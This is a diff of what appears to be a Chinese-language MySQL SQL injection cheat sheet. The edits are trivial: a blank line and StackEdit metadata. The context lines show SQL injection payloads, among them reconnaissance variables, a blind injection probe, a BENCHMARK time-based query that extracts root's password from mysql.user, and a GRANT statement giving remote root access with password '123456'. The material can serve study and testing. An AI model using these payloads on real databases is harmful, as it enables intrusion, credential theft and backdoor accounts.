@@ -28,7 +28,6 @@ load_file() MYSQL读取本地文件的函数
 @@datadir 读取数据库路径  
 @@basedir MYSQL 安装路径  
 @@version_compile_os 操作系统 Windows Server 2003
-
 GRANT ALL PRIVILEGES ON *.* TO ‘root’@’%’ IDENTIFIED BY ‘123456’ WITH GRANT OPTION;
 
 5. mysql一般注入语句
@@ -117,5 +116,5 @@ and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=”blind_sqli�
 
 UNION SELECT IF(SUBSTRING(Password,1,1)=’a’,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTMyNjU2MDAwNl19
+eyJoaXN0b3J5IjpbLTQ0NjIyNTMwNF19
 -->
